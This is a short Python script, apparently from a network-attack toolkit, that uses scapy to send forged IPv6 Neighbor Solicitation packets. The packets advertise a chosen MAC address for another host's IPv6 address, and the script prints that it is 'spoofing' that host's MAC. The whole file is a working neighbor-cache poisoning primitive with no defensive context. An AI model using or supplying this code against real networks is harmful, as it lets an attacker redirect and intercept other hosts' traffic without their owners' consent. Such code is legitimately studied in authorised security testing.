#!/usr/bin/python
from scapy.layers.inet6 import IPv6, ICMPv6ND_NS, ICMPv6NDOptSrcLLAddr, getmacbyip6
from scapy.layers.l2 import Ether
from scapy.sendrecv import sendp


def resolve_NS(interface, smac, sip, tip, vip, vmac):
    if smac == "":
        smac = getmacbyip6(sip)
    if vmac == "":
        vmac = getmacbyip6(vip)

    # Generate packet
    base = IPv6()
    base.dst = tip
    base.src = sip

    packet1 = Ether(src=smac) / base / ICMPv6ND_NS(tgt=vip)/\
             ICMPv6NDOptSrcLLAddr(lladdr=vmac)
    if interface == "":
        sendp(packet1, verbose=False)
    else:
        sendp(packet1, verbose=False, iface=interface)
    print("Spoofing MAC address of the host " + vip + " to resolve MAC address of host " + tip)

